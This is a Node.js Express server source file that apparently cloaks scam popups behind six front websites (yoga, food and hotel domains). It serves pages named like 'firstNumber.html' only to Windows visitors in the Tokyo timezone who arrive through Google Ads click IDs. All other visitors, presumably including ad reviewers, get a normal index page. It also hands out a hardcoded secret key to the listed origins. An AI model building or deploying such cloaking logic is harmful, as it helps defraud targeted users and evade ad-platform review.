const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

const secretKey = "bruceisgenius"; // The secret key to be returned by the GET request

const firstList = ["samuraiyoga", "calmyogaandmeditation", "foodloverjapan"];
const secondList = ["yuyadoonsen"];
const thirdList = ["foodathome"];
const fourthList = ["hotelroyaltonjp"];
const fifthList = [];
const sixthList = [];
const seventhList = [];

// Base domains for allowed origins and referrers
const baseDomains = [
  "yuyadoonsen.info",
  "foodathome.shop",
  "hotelroyaltonjp.com",
  "samuraiyoga.club",
  "calmyogaandmeditation.online",
  "foodloverjapan.us",
];

// Generate all combinations of allowed URLs
const generateAllowedUrls = (domains) => {
  const protocols = ["https://", "http://"];
  const www = ["", "www."];
  const urls = [];
  domains.forEach((domain) => {
    protocols.forEach((protocol) => {
      www.forEach((prefix) => {
        urls.push(`${protocol}${prefix}${domain}`);
      });
    });
  });
  return urls;
};

const allowedUrls = generateAllowedUrls(baseDomains);

// Normalize referer to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Check if the user's OS is Windows
const isWindowsOS = (userAgent) => userAgent.includes("Windows");

// CORS configuration
const corsOptions = {
  origin: (origin, callback) => {
    if (allowedUrls.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));
app.use(express.json());

// Route to handle the POST request
app.post("/", (req, res) => {
  const referer = normalizeReferer(req.headers.referer);
  const userAgent = req.headers["user-agent"];
  const { timezone, fullUrl } = req.body;

  console.log(req.body);
  console.log(`Referer: ${referer}, User-Agent: ${userAgent}`);

  const isTokyoTimezone = timezone === "Asia/Tokyo" || timezone === "Etc/GMT-9";
  console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);

  if (isWindowsOS(userAgent) && isTokyoTimezone && fullUrl?.includes("gclid")) {
    console.log("popupsent");
    if (firstList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "firstNumber.html"));
    } else if (secondList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "secondNumber.html"));
    } else if (thirdList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "thirdNumber.html"));
    } else if (fourthList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "fourthNumber.html"));
    } else if (fifthList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "fifthNumber.html"));
    } else if (sixthList.some((item) => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "sixthNumber.html"));
    } else {
      res.sendFile(path.join(__dirname, "seventhNumber.html"));
    }
  } else {
    console.log("popup not sent");
    res.sendFile(path.join(__dirname, "index.html"));
  }
});

// New GET request for fetching the secret key
app.get("/get-secret-key", (req, res) => {
  const referer = normalizeReferer(req.headers.referer);
  const origin = req.headers.origin;

  // Check if the request is coming from an allowed origin or referrer
  if ((referer && allowedUrls.some((url) => referer.startsWith(url))) ||
      (origin && allowedUrls.includes(origin))) {
    res.json({ secretKey }); // Send the secret key as JSON
  } else {
    res.status(403).send("Access forbidden"); // If not allowed, return 403
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
